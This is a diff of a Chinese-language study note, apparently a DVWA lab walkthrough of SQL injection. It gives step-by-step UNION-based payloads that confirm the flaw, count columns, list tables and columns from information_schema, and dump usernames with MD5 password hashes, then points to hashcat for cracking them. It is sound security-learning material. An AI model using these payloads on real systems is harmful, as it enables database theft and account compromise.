@@ -91,7 +91,83 @@ categories = ['Linux基础']
    | 输入框里写 | 点 Submit 后 | 分析 |
    |---|---|---|
    | `1` | `First name: admin` | 正常 |
-   | **`1'`** | **报错** | SQL把 **`1'`** 当作是一个id名，但是数据库里并没有这个信息，所以报错 |
-   | **`1' AND '1'='1`** | **返回 admin** |
-   | `1' AND '1'='2` | **空白** |
+   | **`1'`** | **报错** | SQL把 **`1'`** 当作是一个id名，但是数据库里并没有这个信息，所以报错 **证明有注入** |
+   | **`1' AND '1'='1`** | **返回 admin** | 因为 **1' AND '1'='1** 整个被当做一个“名字”，所以是字符型(判断类型)
+   | `1' AND '1'='2` | **空白** | 条件可控 |
 
+3. 判断有几列(Column/Field):
+
+   | 输入框里写 | 显示 |
+   |---|---|
+   | `1' ORDER BY 1 #` | 正常 |
+   | **`1' ORDER BY 2 #`** | **正常** ← 至少 2 个格子 |
+   | **`1' ORDER BY 3 #`** | **报错** ← ★ 所以就是 **2 个格子** |
+
+4. 找出哪几个列能看见：
+   | 输入框里写 | 显示 |
+   |---|---|
+   | 0' UNION SELECT 111,222 # |First name: 111  Surname: 222 |
+
+   注：这里的0是为了让原查询空掉
+
+5. 信息收集：
+
+   **输入框里写：**
+   ```
+   0' UNION SELECT group_concat(table_name), 2 FROM information_schema.tables WHERE table_schema=database() #
+   ```
+
+   **看到：**
+   ```
+   First name: users
+   Surname: 2
+   ```
+   **payload拆解：**
+   | 输入 | 目的 |
+   |---|---|
+   | **0'** | 让原查询空掉 |
+   | **UNION SELECT** | 顺便再搬这些 |
+   | **group_concat(table_name)** | 把多个表拼成一个（避免只显示第一行） |
+   | **2** | 第2列随便填个占位 |
+   | **FROM information_schema.tables** | 从**information_schema**的表里面查找 |
+   | **WHERE table_schema = database()** | 只要当前这个数据库的 |
+
+6. 找字段：
+
+   **输入框里写：**
+   ```
+   0' UNION SELECT group_concat(column_name), 2 FROM information_schema.columns WHERE table_name='users' #
+   ```
+   **看到：**
+   ```
+   First name: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
+   Surname: 2
+   ```
+**找到 `user` 和 `password` —— 这个是要偷的东西。**
+
+7. 脱库：
+
+   **输入框里写：**
+   ```
+   0' UNION SELECT group_concat(user, 0x3a, password SEPARATOR 0x0a), 2 FROM users #
+   ```
+
+   **看到：**
+   ```
+   First name: admin:5f4dcc3b5aa765d61d8327deb882cf99
+            gordonb:e99a18c428cb38d5f260853678922e03
+            1337:8d3533d75ae2c3966d7e0d4fcc69216b
+            pablo:0d107d09f5bbe40cade3de5c71e9e9b7
+   Surname: 2
+   ```
+   **payload拆解：**
+   | 输入 | 目的 |
+   |---|---|
+   | **user,** | 第 1 个（用户名） |
+   | **0x3a,** | 中间插个分隔符  0x3a 是十六进制的 ":"（冒号） |
+   | **password,** |第 2 个（密码） |
+    **SEPARATOR 0x0a** | 每份档案之间用  0x0a 分隔（十六进制的换行） |
+   | **, 2** | 第 2 列填个占位 |
+   | **FROM users** | 从 users 里搬 |
+
+8. 密码解密:hashcat
